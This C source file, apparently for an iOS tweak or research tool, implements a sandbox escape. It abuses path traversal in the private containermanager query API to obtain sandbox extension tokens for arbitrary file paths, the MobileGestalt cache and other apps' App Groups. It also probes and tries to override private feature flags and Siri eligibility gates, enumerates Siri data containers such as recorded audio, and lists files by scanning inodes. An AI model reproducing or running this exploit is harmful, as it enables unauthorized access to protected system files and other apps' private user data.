//
//  bad_query.c
//  bad_query
//
//  Created by Taj C on 7/21/26.
//

#include "bad_query.h"
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/stat.h>
#include <xpc/xpc.h>
#include <CoreFoundation/CoreFoundation.h>
#include <notify.h>

#include <sys/mount.h>
#include <sys/fsgetpath.h>

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void (*container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group) {
    // Sanity check our path and check if something already exists there
    if (!path || path[0] != '/') return -255; // Not an absolute path
    if (!create) {
        struct stat st;
        if (lstat(path, &st) != 0) return -254; // File is missing, so we'll return
    }
    
    // Now the fun begins
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1; // Failed to dlopen
    
    // Resolve functions
    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    
    int64_t handle = -1;
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -1; // Failed to resolve a function
    }
    
    // Create query
    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -2; // Failed to create query
    }
    
    // Set up query
    // Two routes here, supply an App Group you control (to access other App Groups on iOS 26) or don't, and use MobileGestalt's SystemGroup as a target instead. If targeting iOS 26 and trying to access App Groups, also set is_group to true to use the correct flags.
    xpc_object_t identifier;
    if (group_identifier == NULL) {
        query_set_class(query, 13); // Class 13 (MCMSharedSystemDataContainer) routes to containermanagerd_system
        identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    } else {
        query_set_class(query, 7); // Class 7 (MCMSharedDataContainer) routes to containermanagerd
        identifier = xpc_string_create(group_identifier);
    }
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3); // Part determines our starting point, part 3 is Library/Caches
    char *part = NULL;
    // Oldest trick in the book. Basic path traversal.
    if (group_identifier == NULL) {
        if (asprintf(&part, "../../../../../../../..%s", path) != -1) {
            query_set_part_domain(query, part);
        } else {
            xpc_release(identifier);
            query_free(query);
            dlclose(mgr);
            return -5; // asprintf failed for some reason
        }
    } else {
        // We have to go one level higher to get to / from an App Group
        if (asprintf(&part, "../../../../../../../../..%s", path) != -1) {
            query_set_part_domain(query, part);
        } else {
            xpc_release(identifier);
            query_free(query);
            dlclose(mgr);
            return -5; // Same thing
        }
    }
    
    // To access App Groups on iOS 26, you have to use different flags, this doesn't apply on 27
    if (is_group) {
        query_set_flags(query, 0x0000000800000000ULL);
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }
    
    // Send our query over
    void *result = query_get_single_result(query);
    if (!result) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -3; // Outside of sandbox
    }
    char *token = copy_sandbox_token(result);
    if (!token) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -4; // Kernel refused to issue a sandbox extension
    }
    
    // Consume our fresh sandbox extension and clean up
    handle = consume_extension(token);
    free(token);
    free(part);
    xpc_release(identifier);
    query_free(query);
    
    dlclose(mgr);
    return handle;
}

int64_t bad_query_ex(char* path, bool create, char *group_identifier, uint64_t container_class) {
    if (!path || path[0] != '/') return -255;
    if (!create) {
        struct stat st;
        if (lstat(path, &st) != 0) return -254;
    }

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    int64_t handle = -1;
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -1;
    }

    void *query = query_create();
    if (!query) { dlclose(mgr); return -2; }

    query_set_class(query, container_class);
    xpc_object_t identifier = xpc_string_create(group_identifier);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);

    // depth of traversal depends on container class path depth
    char *part = NULL;
    if (asprintf(&part, "../../../../../../../../..%s", path) == -1) {
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -5;
    }
    query_set_part_domain(query, part);
    query_set_flags(query, 0x0000008000000000ULL);

    void *result = query_get_single_result(query);
    if (!result) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -3;
    }
    char *token = copy_sandbox_token(result);
    if (!token) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -4;
    }

    handle = consume_extension(token);
    free(token);
    free(part);
    xpc_release(identifier);
    query_free(query);
    dlclose(mgr);
    return handle;
}

void bad_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}

// MobileGestalt direct API - reads values from the running MobileGestaltHelper daemon
// This tells us what the system ACTUALLY sees, not just what's in the plist
typedef void *(*MGCopyAnswerFn)(const void *);
typedef bool (*MGGetBoolAnswerFn)(const void *);

void *mg_copy_answer(const char *key) {
    void *mg = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mg) return NULL;
    MGCopyAnswerFn fn = (MGCopyAnswerFn)dlsym(mg, "MGCopyAnswer");
    if (!fn) { dlclose(mg); return NULL; }
    // Create CFString from C string
    CFStringRef cfKey = CFStringCreateWithCString(kCFAllocatorDefault, key, kCFStringEncodingUTF8);
    if (!cfKey) { dlclose(mg); return NULL; }
    void *result = fn(cfKey);
    CFRelease(cfKey);
    dlclose(mg);
    return result; // caller must CFRelease
}

bool mg_get_bool_answer(const char *key) {
    void *mg = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mg) return false;
    MGGetBoolAnswerFn fn = (MGGetBoolAnswerFn)dlsym(mg, "MGGetBoolAnswer");
    if (!fn) { dlclose(mg); return false; }
    CFStringRef cfKey = CFStringCreateWithCString(kCFAllocatorDefault, key, kCFStringEncodingUTF8);
    if (!cfKey) { dlclose(mg); return false; }
    bool result = fn(cfKey);
    CFRelease(cfKey);
    dlclose(mg);
    return result;
}

void mg_notify_cache_changed(void) {
    notify_post("com.apple.MobileGestalt.cache-changed");
}

void post_darwin_notification(const char *name) {
    notify_post(name);
}

char *probe_private_apis(void) {
    size_t cap = 8192;
    char *out = malloc(cap);
    if (!out) return NULL;
    size_t len = 0;

    void *ff = dlopen("/usr/lib/libFeatureFlags.dylib", RTLD_LAZY);
    if (!ff) ff = dlopen("/System/Library/PrivateFrameworks/FeatureFlags.framework/FeatureFlags", RTLD_LAZY);
    if (ff) {
        len += snprintf(out + len, cap - len, "FF:loaded\n");
        const char *syms[] = {
            "_os_feature_enabled_impl",
            "_os_feature_enabled_simple_impl",
            "_os_feature_flag_get_enabled_value",
            "os_feature_flag_override_set_bool",
            "_os_feature_flag_override_set_bool",
            "_os_feature_flag_override_set",
            "os_feature_flag_set_override",
            "_os_feature_flag_set_override",
            "_os_feature_flag_override_get",
            "_os_feature_flag_override_remove",
            "_os_feature_flag_value_impl",
            NULL
        };
        for (int i = 0; syms[i]; i++) {
            if (dlsym(ff, syms[i]))
                len += snprintf(out + len, cap - len, "FF:FOUND:%s\n", syms[i]);
        }
        dlclose(ff);
    } else {
        len += snprintf(out + len, cap - len, "FF:not_loaded:%s\n", dlerror() ? dlerror() : "unknown");
    }

    void *el = NULL;
    const char *el_paths[] = {
        "/System/Library/PrivateFrameworks/EligibilityCore.framework/EligibilityCore",
        "/System/Library/PrivateFrameworks/OSEligibility.framework/OSEligibility",
        "/usr/lib/libos_eligibility.dylib",
        NULL
    };
    for (int i = 0; el_paths[i] && !el; i++)
        el = dlopen(el_paths[i], RTLD_LAZY);
    if (el) {
        len += snprintf(out + len, cap - len, "EL:loaded\n");
        const char *syms[] = {
            "os_eligibility_check_domain",
            "os_eligibility_check_domain_v2",
            "os_eligibility_get_domain_answer",
            "os_eligibility_set_domain_answer",
            "os_eligibility_domain_set_input",
            "os_eligibility_set_input",
            "_os_eligibility_get_internal_state",
            "os_eligibility_copy_answer",
            "os_eligibility_copy_inputs_for_domain",
            NULL
        };
        for (int i = 0; syms[i]; i++) {
            if (dlsym(el, syms[i]))
                len += snprintf(out + len, cap - len, "EL:FOUND:%s\n", syms[i]);
        }
        dlclose(el);
    } else {
        len += snprintf(out + len, cap - len, "EL:not_loaded\n");
    }

    return out;
}

int ff_try_set(const char *subsystem, const char *flag, bool value) {
    void *ff = dlopen("/usr/lib/libFeatureFlags.dylib", RTLD_LAZY);
    if (!ff) ff = dlopen("/System/Library/PrivateFrameworks/FeatureFlags.framework/FeatureFlags", RTLD_LAZY);
    if (!ff) return -1;

    typedef void (*set3_fn)(const char *, const char *, bool);
    const char *names[] = {
        "os_feature_flag_override_set_bool",
        "_os_feature_flag_override_set_bool",
        "_os_feature_flag_override_set",
        "os_feature_flag_set_override",
        "_os_feature_flag_set_override",
        NULL
    };

    int result = -2;
    for (int i = 0; names[i]; i++) {
        set3_fn f = (set3_fn)dlsym(ff, names[i]);
        if (f) {
            f(subsystem, flag, value);
            result = 0;
            break;
        }
    }

    dlclose(ff);
    return result;
}

int ff_check(const char *subsystem, const char *flag) {
    void *ff = dlopen("/usr/lib/libFeatureFlags.dylib", RTLD_LAZY);
    if (!ff) ff = dlopen("/System/Library/PrivateFrameworks/FeatureFlags.framework/FeatureFlags", RTLD_LAZY);
    if (!ff) return -1;

    // Open-source WebKit declares the private SPI as:
    // bool _os_feature_enabled_impl(const char *domain, const char *feature);
    typedef bool (*check_fn)(const char *, const char *);

    void *sym = dlsym(ff, "_os_feature_enabled_impl");
    if (!sym) sym = dlsym(ff, "_os_feature_enabled_simple_impl");

    int result = -2;
    if (sym) {
        result = ((check_fn)sym)(subsystem, flag) ? 1 : 0;
    }

    dlclose(ff);
    return result;
}

char *siri_gate_probe(void) {
    const char *assistant_paths[] = {
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        NULL
    };
    const char *assistant_symbols[] = {
        "AFDeviceSupportsSystemAssistantExperience",
        "AFDeviceSupportsSAEByDeviceCapabilityAndFeatureFlags",
        "AFLocaleSupportsSAE",
        "AFDeviceSupportsSAE",
        "AFHasGMSCapability",
        "AFHasGMSCapabilityUnembargoed",
        "AFDeviceSupportsSiriUOD",
        "AFUODStatusSupportedFull",
        NULL
    };
    const char *mg_symbols[] = {
        "_MobileGestalt_get_deviceSupportsSiriUnderstandingOnDevice",
        "MobileGestalt_get_deviceSupportsSiriUnderstandingOnDevice",
        NULL
    };
    const char *ff_domains[][2] = {
        { "Siri", "sae_override" },
        { "Siri", "assistant_engine_override" },
        { "Siri", "assistant_engine" },
        { "Siri", "force_uod_enabled_for_device" },
        { "SiriUI", "sae" },
        { "SiriUI", "sae_use_container" },
        { "SiriNL", "NLRouter" },
        { "GenerativeModels", "GenerativeModelsAvailability" },
        { "IntelligenceFlow", "IntelligenceFlow" },
        { NULL, NULL }
    };

    size_t cap = 8192;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = NULL;
    for (int i = 0; assistant_paths[i] && !assistant; i++)
        assistant = dlopen(assistant_paths[i], RTLD_NOW | RTLD_LOCAL);

    len += snprintf(out + len, cap - len, "[AssistantServices] loaded=%d\n", assistant != NULL);
    if (assistant) {
        for (int i = 0; assistant_symbols[i]; i++) {
            void *symbol = dlsym(assistant, assistant_symbols[i]);
            len += snprintf(out + len, cap - len, "%s=%s\n", assistant_symbols[i],
                            symbol ? "PRESENT_NOT_CALLED" : "NO_SYMBOL");
        }
        dlclose(assistant);
    }

    void *mg = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_NOW | RTLD_LOCAL);
    len += snprintf(out + len, cap - len, "[MobileGestalt Siri UOD]\n");
    if (mg) {
        for (int i = 0; mg_symbols[i]; i++) {
            void *symbol = dlsym(mg, mg_symbols[i]);
            len += snprintf(out + len, cap - len, "%s=%s\n", mg_symbols[i],
                            symbol ? "PRESENT_NOT_CALLED" : "NO_SYMBOL");
        }
        dlclose(mg);
    } else {
        len += snprintf(out + len, cap - len, "library=NOT_LOADED\n");
    }

    len += snprintf(out + len, cap - len, "[FeatureFlags]\n");
    for (int i = 0; ff_domains[i][0]; i++) {
        int value = ff_check(ff_domains[i][0], ff_domains[i][1]);
        len += snprintf(out + len, cap - len, "%s.%s=%d\n",
                        ff_domains[i][0], ff_domains[i][1], value);
    }

    return out;
}

char *siri_group_probe(void) {
    const char *group_ids[] = {
        "group.com.apple.assistant.shared",
        "group.com.apple.assistant.shared.backedup",
        "group.com.apple.siri.ASR.shared",
        "group.com.apple.siri.recorded-audio",
        "group.com.apple.siri.referenceResolution",
        "group.com.apple.siri.inference",
        "group.com.apple.siri.sirisuggestions",
        "group.com.apple.siri.userfeedbacklearning",
        "group.com.apple.siri.remembers",
        "group.com.apple.siri.GMSSELFIngestor",
        NULL
    };

    size_t cap = 16384;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) {
        snprintf(out, cap, "containermanager=NOT_LOADED\n");
        return out;
    }

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    typedef char *(*container_copy_path_fn)(void *, uint64_t *);
    container_copy_path_fn copy_path = (container_copy_path_fn)dlsym(mgr, "container_copy_path");

    if (!query_create || !query_set_class || !query_set_group_identifiers ||
        !query_set_flags || !query_set_part || !query_get_single_result ||
        !query_free || !copy_path) {
        snprintf(out, cap, "containermanager=SYMBOLS_MISSING\n");
        dlclose(mgr);
        return out;
    }

    for (int i = 0; group_ids[i]; i++) {
        void *query = query_create();
        if (!query) {
            len += snprintf(out + len, cap - len, "%s=QUERY_CREATE_FAILED\n", group_ids[i]);
            continue;
        }

        query_set_class(query, 7); // MCMSharedDataContainer / app group
        xpc_object_t identifier = xpc_string_create(group_ids[i]);
        query_set_group_identifiers(query, identifier);
        query_set_part(query, 3); // known-valid Library/Caches part; copy_path still returns container root
        query_set_flags(query, 0x0000000800000000ULL);

        void *result = query_get_single_result(query);
        if (!result) {
            len += snprintf(out + len, cap - len, "%s=NO_RESULT\n", group_ids[i]);
        } else {
            uint64_t error = 0;
            char *path = copy_path(result, &error);
            if (path) {
                len += snprintf(out + len, cap - len, "%s=PATH:%s\n", group_ids[i], path);
                free(path);
            } else {
                len += snprintf(out + len, cap - len, "%s=PATH_ERROR:%llu\n",
                                group_ids[i], (unsigned long long)error);
            }
        }

        xpc_release(identifier);
        query_free(query);
    }

    dlclose(mgr);
    return out;
}

int siri_gate_call_confirmed(int gate_index) {
    // Callsites recovered from iOS 26.1 invoke both exports with no arguments.
    // Keep each invocation isolated so an exact-build behavioral failure cannot
    // hide the result of another gate, as happened in v10's batch probe.
    const char *symbols[] = {
        "AFDeviceSupportsSystemAssistantExperience",
        "AFDeviceSupportsSAEByDeviceCapabilityAndFeatureFlags",
    };
    if (gate_index < 0 || gate_index >= 2) return -1;

    void *assistant = dlopen(
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        RTLD_NOW | RTLD_LOCAL);
    if (!assistant) return -2;

    typedef bool (*confirmed_bool_noargs_fn)(void);
    confirmed_bool_noargs_fn fn =
        (confirmed_bool_noargs_fn)dlsym(assistant, symbols[gate_index]);
    if (!fn) {
        dlclose(assistant);
        return -3;
    }

    int result = fn() ? 1 : 0;
    dlclose(assistant);
    return result;
}

char *elig_probe_domains(void) {
    // v7 proved the guessed ABI crashes on iOS 27. Keep this exported entry
    // point inert until a prototype is recovered from the matching binary.
    return strdup("disabled:eligibility_abi_unverified\n");
}

int elig_set_input_try(int p1, int p2, int p3) {
    (void)p1;
    (void)p2;
    (void)p3;
    return -102; // disabled: eligibility ABI unverified
}

char *mg_probe_extra_keys(void) {
    void *mg = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mg) return strdup("no_lib");

    typedef void *(*MGCopyAnswerFn)(const void *);
    MGCopyAnswerFn fn = (MGCopyAnswerFn)dlsym(mg, "MGCopyAnswer");
    if (!fn) { dlclose(mg); return strdup("no_fn"); }

    const char *keys[] = {
        "oPeik/9e8lQWMszEjbPzng",
        "qNNddlUK+B/YlooNoymwgA",
        "IMLaTlEKsZ4jjGfHG/bVEg",
        "3iiS7QzaQ7/UV9cSk2sn/A",
        "Efj9FNfV60OLkq9HSOVY3Q",
        "YlEtRmOVvRG0xznyT6qevQ",
        "7MKiVMCJB3WEcOElKrGkog",
        "ASDqJXBxJ3OpjRM9aQFLWg",
        "zHeENZu+wbg7PUprwNwBWg",
        "RqQ7DSxER3BAoOivu/q8Vg",
        "+3Uf0Pm5F8Xy7Onyvko0vA",
        "J/MYIxisnrhXiJFa3pLdyg",
        NULL
    };
    const char *names[] = {
        "AlwaysOnAssistant",
        "DeviceClassNumber",
        "DeviceVariant",
        "SiriEnabled",
        "MLCapable",
        "ANECapable",
        "ANENumCores",
        "DeviceHasANE",
        "HeySiriSupport",
        "SiriAllowed",
        "NeuralEngine",
        "SiriGestaltKey",
        NULL
    };

    size_t cap = 4096;
    char *out = malloc(cap);
    if (!out) { dlclose(mg); return NULL; }
    size_t len = 0;

    for (int i = 0; keys[i]; i++) {
        CFStringRef cfKey = CFStringCreateWithCString(kCFAllocatorDefault, keys[i], kCFStringEncodingUTF8);
        if (!cfKey) continue;
        void *val = fn(cfKey);
        CFRelease(cfKey);
        if (val) {
            CFTypeID tid = CFGetTypeID(val);
            if (tid == CFBooleanGetTypeID()) {
                len += snprintf(out + len, cap - len, "%s=%s\n", names[i],
                    CFBooleanGetValue(val) ? "true" : "false");
            } else if (tid == CFNumberGetTypeID()) {
                int64_t n = 0;
                CFNumberGetValue(val, kCFNumberSInt64Type, &n);
                len += snprintf(out + len, cap - len, "%s=%lld\n", names[i], n);
            } else if (tid == CFStringGetTypeID()) {
                char buf[256];
                CFStringGetCString(val, buf, sizeof(buf), kCFStringEncodingUTF8);
                len += snprintf(out + len, cap - len, "%s=%s\n", names[i], buf);
            } else {
                len += snprintf(out + len, cap - len, "%s=<type%lu>\n", names[i], tid);
            }
            CFRelease(val);
        }
    }

    if (len == 0)
        len += snprintf(out + len, cap - len, "no_results\n");

    dlclose(mg);
    return out;
}

char *bad_query_list(char *path, int64_t max_inode) {
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) return NULL;
    fsid_t fsid = sfs.f_fsid;
    
    size_t cap = 65536;
    size_t length = 0;
    size_t path_length = strlen(path);
    
    char *out = malloc(cap);
    if (!out) return NULL;
    out[0] = '\0';
    
    char buf[1200];
    for (uint64_t ino = 1; ino <= max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;
        
        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;
        
        size_t need = strlen(p) + 2;
        if (length + need > cap) { cap *= 2; char *t = realloc(out, cap); if (!t) break; out = t; }
        length += snprintf(out + length, cap - length, "%s\n", p);
    }
    return out;
}
